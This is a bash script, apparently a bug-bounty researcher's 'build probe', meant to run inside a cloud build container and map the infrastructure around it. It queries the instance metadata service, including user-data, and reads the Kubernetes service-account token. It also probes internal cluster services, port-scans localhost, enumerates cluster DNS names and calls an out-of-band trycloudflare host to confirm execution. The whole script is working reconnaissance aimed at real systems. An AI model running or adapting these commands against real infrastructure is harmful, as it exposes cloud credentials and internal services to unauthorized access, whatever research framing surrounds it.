#!/bin/bash
echo "=== BUILD PROBE START $(date -u) ==="

echo "=== RESOLV.CONF ==="
cat /etc/resolv.conf 2>&1 || true

echo "=== HOSTNAME ==="
hostname 2>&1 || true

echo "=== IP ADDR ==="
ip addr 2>&1 || true

echo "=== IP ROUTE ==="
ip route 2>&1 || true

echo "=== PROC NET ==="
cat /proc/net/tcp 2>&1 | head -20 || true
cat /proc/net/route 2>&1 || true

echo "=== ENV ==="
env | sort | grep -vE 'PASSWORD|SECRET|TOKEN|KEY' | head -30 2>&1 || true

echo "=== IMDS v1 JSON ==="
curl -sv --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/v1.json 2>&1 || echo "IMDS_FAILED"

echo "=== IMDS v1 ID ==="
curl -sv --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/v1/id 2>&1 || echo "IMDS_ID_FAILED"

echo "=== IMDS v1 HOSTNAME ==="
curl -sv --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/v1/hostname 2>&1 || echo "IMDS_HOSTNAME_FAILED"

echo "=== IMDS v1 REGION ==="
curl -sv --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/v1/region 2>&1 || echo "IMDS_REGION_FAILED"

echo "=== IMDS v1 USER-DATA ==="
curl -sv --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/v1/user-data 2>&1 || echo "IMDS_USERDATA_FAILED"

echo "=== K8S API ==="
curl -svk --connect-timeout 3 --max-time 5 https://10.245.0.1:443/version 2>&1 || echo "K8S_API_FAILED"

echo "=== K8S SA TOKEN ==="
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 || echo "NO_SA_TOKEN"

echo "=== K8S SA CA ==="
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 || echo "NO_SA_DIR"

echo "=== COUCHDB ==="
curl -sv --connect-timeout 3 --max-time 5 http://10.245.189.148:5984/ 2>&1 || echo "COUCHDB_FAILED"

echo "=== CERT-MANAGER v1 ==="
curl -sv --connect-timeout 3 --max-time 5 http://10.245.126.166:9402/metrics 2>&1 | head -30 || echo "CERTMGR_V1_FAILED"

echo "=== CERT-MANAGER v2 ==="
curl -sv --connect-timeout 3 --max-time 5 http://10.245.162.19:9402/metrics 2>&1 | head -30 || echo "CERTMGR_V2_FAILED"

echo "=== KUBE-DNS ==="
curl -sv --connect-timeout 3 --max-time 5 http://10.245.0.10:9153/metrics 2>&1 | head -30 || echo "KUBEDNS_METRICS_FAILED"

echo "=== KUBE-DNS HEALTH ==="
curl -sv --connect-timeout 3 --max-time 5 http://10.245.0.10:8080/health 2>&1 || echo "KUBEDNS_HEALTH_FAILED"

echo "=== KUBE-DNS 8181 ==="
curl -sv --connect-timeout 3 --max-time 5 http://10.245.0.10:8181/ready 2>&1 || echo "KUBEDNS_8181_FAILED"

echo "=== LOCALHOST SCAN ==="
for port in 80 443 8080 8443 9090 9100 9153 10250 10255 10256 6443 2379 5984 3000 53 25; do
  (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo "OPEN:$port" || true
done

echo "=== SSRF SHERIFF ==="
curl -svk --connect-timeout 5 --max-time 8 "https://ssrf-sheriff.internal.digitalocean.com/?X-BBP-Researcher=mrunal" 2>&1 || echo "SHERIFF_FAILED"

echo "=== DNS ENUM ==="
for svc in kubernetes.default kube-dns.kube-system couchdb.openwhisk cert-manager.cert-manager coredns.kube-system metrics-server.kube-system node-exporter.monitoring prometheus.monitoring grafana.monitoring ssrf-sheriff.default ssrf-sheriff.security; do
    nslookup ${svc}.svc.cluster.local 2>&1 | grep -E 'Address|NXDOMAIN|SERVFAIL' || true
done

echo "=== OOB BUILD PING ==="
curl -sv --connect-timeout 5 --max-time 8 "https://cheapest-vessel-hometown-equipped.trycloudflare.com/docker-build-probe" 2>&1 || echo "OOB_FAILED"

echo "=== BUILD PROBE END $(date -u) ==="
